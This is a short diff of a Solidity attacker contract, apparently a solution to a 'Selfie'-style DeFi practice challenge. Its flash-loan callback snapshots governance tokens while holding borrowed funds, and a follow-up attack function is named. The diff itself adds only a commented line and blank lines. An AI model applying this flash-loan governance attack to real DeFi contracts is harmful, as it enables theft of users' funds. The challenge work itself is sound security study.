@@ -74,12 +74,16 @@ interface ISelfiePool {
 
 */
 
+   //  function onFlashLoan(address _initiator, address _token, uint256 _amount, uint256 _fee, bytes calldata _data) public returns(bytes32){
+    
     function onFlashLoan(address _initiator, address _token, uint256 _amount, uint256 _fee, bytes calldata _data) public returns(bytes32){
 
             snapshotId = token.snapshot();
             token.approve(address(flashPool), token.balanceOf(address(this)));            
             return CALLBACK_SUCCESS;
     }
+
+
 
 
     function attack2After2Days() public {
